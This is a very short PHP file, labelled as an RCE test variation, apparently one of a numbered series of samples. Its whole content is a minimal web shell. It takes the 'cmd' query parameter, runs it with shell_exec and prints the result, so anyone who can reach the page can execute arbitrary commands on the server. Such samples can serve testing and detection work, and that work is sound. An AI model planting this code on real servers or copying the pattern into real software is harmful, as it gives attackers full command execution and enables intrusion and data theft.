<?php
// RCE test variation #1477
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>